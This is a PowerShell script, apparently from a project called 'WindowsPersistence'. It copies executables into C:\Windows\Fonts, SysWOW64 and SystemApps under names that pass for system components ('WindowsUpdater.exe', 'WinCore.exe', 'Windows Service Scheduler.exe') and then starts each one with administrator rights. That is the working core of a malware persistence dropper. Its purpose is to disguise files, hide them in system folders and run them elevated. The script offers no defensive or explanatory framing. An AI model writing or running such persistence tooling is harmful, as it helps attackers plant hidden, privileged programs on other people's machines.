# Define source and destination paths
$copyPaths = @{
    "..\WindowsPersistence\Deploy\Bin1 to Fonts\" = "C:\Windows\Fonts\";
    "..\WindowsPersistence\Deploy\Bin2 to Syswow64\" = "C:\Windows\SysWOW64\";
    "..\WindowsPersistence\Deploy\Bin3 to SystemApps\" = "C:\Windows\SystemApps\";
}

# Copy files from source to destination
foreach ($source in $copyPaths.Keys) {
    $destination = $copyPaths[$source]

    if (Test-Path -Path $source) {
        # Ensure the destination directory exists
        if (!(Test-Path -Path $destination)) {
            New-Item -ItemType Directory -Path $destination -Force
            Write-Output "Created directory: $destination"
        }

        # Copy contents from source to destination
        try {
            Copy-Item -Path "$source*" -Destination $destination -Recurse -Force
            Write-Output "Copied files from $source to $destination"
        }
        catch {
            Write-Output "Failed to copy files from $source to $destination - $($_.Exception.Message)"
        }
    }
    else {
        Write-Output "Source directory not found: $source"
    }
}

# Define binaries to run as admin with their working directories
$binaries = @(
    @{ Path = "C:\Windows\Fonts\Windows Service Scheduler.exe"; WorkingDirectory = "C:\Windows\Fonts" },
    @{ Path = "C:\Windows\SysWOW64\WinCore.exe"; WorkingDirectory = "C:\Windows\SysWOW64" },
    @{ Path = "C:\Windows\SystemApps\WindowsUpdater.exe"; WorkingDirectory = "C:\Windows\SystemApps" }
)

# Run each binary as administrator
foreach ($binary in $binaries) {
    $filePath = $binary.Path
    $workingDir = $binary.WorkingDirectory

    if (Test-Path -Path $filePath) {
        try {
            Start-Process -FilePath $filePath -Verb RunAs -WorkingDirectory $workingDir
            Write-Output "Executed $filePath as administrator"
        }
        catch {
            Write-Output "Failed to execute $filePath as administrator - $($_.Exception.Message)"
        }
    }
    else {
        Write-Output "Binary not found: $filePath"
    }
}
